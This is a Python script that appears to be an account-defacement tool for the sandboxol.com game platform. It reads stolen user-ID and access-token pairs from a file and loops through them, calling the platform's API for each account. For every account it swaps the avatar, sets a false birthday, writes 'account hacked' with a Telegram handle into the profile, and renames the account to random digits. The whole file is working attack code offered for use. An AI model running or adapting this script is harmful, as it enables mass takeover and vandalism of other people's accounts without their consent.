import random

import requests

with open("bot.txt", "r") as file:
    bot = file.readlines()

send = -1

while True:
    send += 1
    id, token = bot[send].strip().split(":")

    headers = {
        "userId": id,
        "Access-Token": token,
        "User-Agent": ""
    }

    data = {
        "picUrl": random.choice([
            "http://staticgs.sandboxol.com/sandbox/avatar/1735765432742507.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735765774322468.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766202722958.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766333999825.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766509212498.jpg"
        ]),
        "birthday": "0688-01-01",
        "details": "account hacked\ntelegram @nullowns\nt.mе/nullowns"
    }

    try:
        response = requests.put("https://gw.sandboxol.com/user/api/v1/user/info", headers=headers, json=data).json()
    except:
        send -= 1
        continue

    if response["message"] == "SUCCESS":
        try:
            response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={''.join(random.choices('0123456789', k=20))}&oldName={response['data']['nickName']}", headers=headers).json()
        except:
            send -= 1
            continue

        print(response["message"] + f" | {id} | {send + 1}")
